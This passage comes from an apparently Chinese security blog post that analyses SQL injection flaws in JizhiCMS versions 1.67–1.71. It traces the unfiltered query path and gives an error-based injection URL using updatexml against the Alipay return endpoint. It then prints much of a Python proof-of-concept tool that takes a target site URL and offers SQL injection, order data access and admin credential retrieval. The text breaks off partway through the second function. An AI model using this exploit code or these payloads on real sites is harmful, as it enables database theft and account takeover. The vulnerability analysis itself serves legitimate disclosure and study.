+</span></span><span class="line"><span class="cl">		<span class="nv">$fields</span> <span class="o">=</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$fields</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&#34;*&#34;</span> <span class="o">:</span> <span class="nv">$fields</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT </span><span class="si">{</span><span class="nv">$fields</span><span class="si">}</span><span class="s2"> FROM </span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">table</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="nv">$where</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getData</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再跟进一下getData函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//获取数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">public</span> <span class="k">function</span> <span class="nf">getData</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">))</span><span class="k">return</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Statement</span><span class="o">-&gt;</span><span class="na">rowCount</span><span class="p">())</span><span class="k">return</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$rows</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="k">while</span><span class="p">(</span><span class="nv">$rows</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Statement</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">)){}</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Statement</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">array_pop</span><span class="p">(</span><span class="nv">$rows</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$rows</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进query执行函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//执行SQL语句并检查是否错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">public</span> <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$sql</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Statement</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">Statement</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pdo</span><span class="o">-&gt;</span><span class="na">errorInfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$msg</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;数据库错误：&#39;</span> <span class="o">.</span> <span class="nv">$msg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看到<code>$msg = $this-&gt;pdo-&gt;errorInfo();</code>语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出</p>
+<p>一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过<code>format_param</code>过滤，会产生注入</p>
+<p>例如:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">exploit</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">M</span><span class="p">(</span><span class="s1">&#39;member&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">([</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果直接这样GET POST REQUEST 带入数据库 会产生报错注入</p>
+<p>例如  ./exploit/name=123&rsquo;  (加一个引号会报错，如果引号没过滤)</p>
+<p>现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了</p>
+<p>简单寻找下其实这样的地方挺多的，拿一个位置举例子</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202170918836.jpg"
+        data-srcset="/images/202202170918836.jpg, /images/202202170918836.jpg 1.5x, /images/202202170918836.jpg 2x"
+        data-sizes="auto"
+        alt="/images/202202170918836.jpg"
+        title="/images/202202170918836.jpg" /></p>
+<p>这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证</p>
+<p>可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202170919997.jpg"
+        data-srcset="/images/202202170919997.jpg, /images/202202170919997.jpg 1.5x, /images/202202170919997.jpg 2x"
+        data-sizes="auto"
+        alt="/images/202202170919997.jpg"
+        title="/images/202202170919997.jpg" /></p>
+<p>可以看到的确出现了sql语句和数据库错误</p>
+<p>直接报错注入获取敏感信息</p>
+<ul>
+<li><code>mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+&quot;</code></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/202202170919441.jpg"
+        data-srcset="/images/202202170919441.jpg, /images/202202170919441.jpg 1.5x, /images/202202170919441.jpg 2x"
+        data-sizes="auto"
+        alt="/images/202202170919441.jpg"
+        title="/images/202202170919441.jpg" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">官网url : https://www.jizhicms.cn/
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mPOC_Des: http://wiki.peiqi.tech                                   </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mGithub : https://github.com/PeiQi0                                 </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34m公众号 : PeiQi文库                                                </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[34mVersion: 极致CMS 1.67 - 171             </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+  </span><span class="se">\033</span><span class="s1">[36m使用格式: python3 CNVD-2020-49710.py     </span><span class="se">\033</span><span class="s1">[0m&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;+------------------------------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">poc</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s1">&#39;选择使用的poc：</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;1.sql注入</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;2.用户购物车爆破</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;3.GET 网站管理员账号密码</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;4.退出 quit</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                        <span class="s1">&#39;poc:&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">poc</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">poc_1</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">poc</span> <span class="o">==</span> <span class="s1">&#39;2&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">poc_2</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">poc</span> <span class="o">==</span> <span class="s1">&#39;3&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">poc_3</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">poc</span> <span class="o">==</span> <span class="s1">&#39;4&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;参数错误，重新输入&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">poc_1</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## poc_1 ---&gt;  sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay])</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    function alipay_return_pay(){
+</span></span></span><span class="line"><span class="cl"><span class="s2">    		extendFile(&#39;pay/alipay/AlipayServiceCheck.php&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    		//支付宝公钥，账户中心-&gt;密钥管理-&gt;开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥
+</span></span></span><span class="line"><span class="cl"><span class="s2">    		$alipayPublicKey=$this-&gt;webconf[&#39;alipay_public_key&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    		$aliPay = new \AlipayServiceCheck($alipayPublicKey);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    		//验证签名
+</span></span></span><span class="line"><span class="cl"><span class="s2">    		$result = $aliPay-&gt;rsaCheck($_GET,$_GET[&#39;sign_type&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            $result=true;   &lt;&lt;--- (添加的php代码 模拟打开支付宝 并通过签名验证)
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            if($result===true){
+</span></span></span><span class="line"><span class="cl"><span class="s2">    			//同步回调一般不处理业务逻辑，显示一个付款成功的页面，或者跳转到用户的财务记录页面即可。
+</span></span></span><span class="line"><span class="cl"><span class="s2">    			//echo &#39;&lt;h1&gt;付款成功&lt;/h1&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    			$out_trade_no = htmlspecialchars($_GET[&#39;out_trade_no&#39;]);  &lt;&lt; ---- （漏洞位置，只过滤了xss，没有调用函数过滤sql语句）
+</span></span></span><span class="line"><span class="cl"><span class="s2">    			$orderno = $out_trade_no;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    			$paytime = time();
+</span></span></span><span class="line"><span class="cl"><span class="s2">    			$order = M(&#39;orders&#39;)-&gt;find([&#39;orderno&#39;=&gt;$orderno]);  &lt;&lt; --- (执行sql注入的语句)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exploit_url</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;攻击网站url：</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入你的payload（sql）语句:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># mypay/alipay_return_pay?out_trade_no=1</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload_url</span> <span class="o">=</span> <span class="n">exploit_url</span> <span class="o">+</span> <span class="s2">&#34;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(&#34;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s2">&#34;),0x7e),1)--+&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># print(&#39;你的payload语句为: \n&#39;, payload_url)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">payload_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># print(response.text)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;~(.*?)~&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="p">[]:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[!!] sql语句错误 或者 版本高于 [极致cms 1.71  -&gt; 发布时间 2020-05-25]&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;得到的数据为:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;出现错误&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;------------------ peiqi -----------------------&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">poc_2</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## poc_2 ---&gt; 用户购物车页面获取 (Home/c/UserController.php [orderdetails])</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## 漏洞点 ---&gt; 无用户cookie id 的验证</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日)</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    function orderdetails(){
+</span></span></span><span class="line"><span class="cl"><span class="s2">    	$orderno = $this-&gt;frparam(&#39;orderno&#39;,1);
+</span></span></span><span class="line"><span class="cl"><span class="s2">		$order = M(&#39;orders&#39;)-&gt;find([&#39;orderno&#39;=&gt;$orderno]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">		if($orderno &amp;&amp; $order){
+</span></span></span><span class="line"><span class="cl"><span class="s2">			/*
+</span></span></span><span class="line"><span class="cl"><span class="s2">			if($order[&#39;isshow&#39;]!=1){
+</span></span></span><span class="line"><span class="cl"><span class="s2">				//超时或者已支付
+</span></span></span><span class="line"><span class="cl"><span class="s2">				if($order[&#39;isshow&#39;]==0){
+</span></span></span><span class="line"><span class="cl"><span class="s2">					$msg = &#39;订单已删除&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">				}
+</span></span></span><span class="line"><span class="cl"><span class="s2">				if($order[&#39;isshow&#39;]==3){
+</span></span></span><span class="line"><span class="cl"><span class="s2">					$msg = &#39;订单已过期，不可支付！&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">				}
+</span></span></span><span class="line"><span class="cl"><span class="s2">				if($order[&#39;isshow&#39;]==2){
+</span></span></span><span class="line"><span class="cl"><span class="s2">					$msg = &#39;订单已支付，请勿重复操作！&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">				}
+</span></span></span><span class="line"><span class="cl"><span class="s2">				if($this-&gt;frparam(&#39;ajax&#39;)){
+</span></span></span><span class="line"><span class="cl"><span class="s2">					JsonReturn([&#39;code&#39;=&gt;1,&#39;msg&#39;=&gt;$msg]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">				}
+</span></span></span><span class="line"><span class="cl"><span class="s2">				Error($msg);
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">			}
+</span></span></span><span class="line"><span class="cl"><span class="s2">			*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">			$carts = explode(&#39;||&#39;,$order[&#39;body&#39;]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">			$new = [];
+</span></span></span><span class="line"><span class="cl"><span class="s2">			foreach($carts as $k=&gt;$v){
+</span></span></span><span class="line"><span class="cl"><span class="s2">				$d = explode(&#39;-&#39;,$v);
+</span></span></span><span class="line"><span class="cl"><span class="s2">				if($d[0]!=&#39;&#39;){
+</span></span></span><span class="line"><span class="cl"><span class="s2">					//兼容多模块化
+</span></span></span><span class="line"><span class="cl"><span class="s2">					if(isset($this-&gt;classtypedata[$d[0]])){
+</span></span></span><span class="line"><span class="cl"><span class="s2">						$type = $this-&gt;classtypedata[$d[0]];
+</span></span></span><span class="line"><span class="cl"><span class="s2">						$res = M($type[&#39;molds&#39;])-&gt;find([&#39;id&#39;=&gt;$d[1]]);
+</span></span></span><span class="line"><span class="cl"><span class="s2">						$new[] = [&#39;info&#39;=&gt;$res,&#39;num&#39;=&gt;$d[2],&#39;tid&#39;=&gt;$d[0],&#39;id&#39;=&gt;$d[1],&#39;price&#39;=&gt;$d[3]];
+</span></span></span><span class="line"><span class="cl"><span class="s2">					}else{
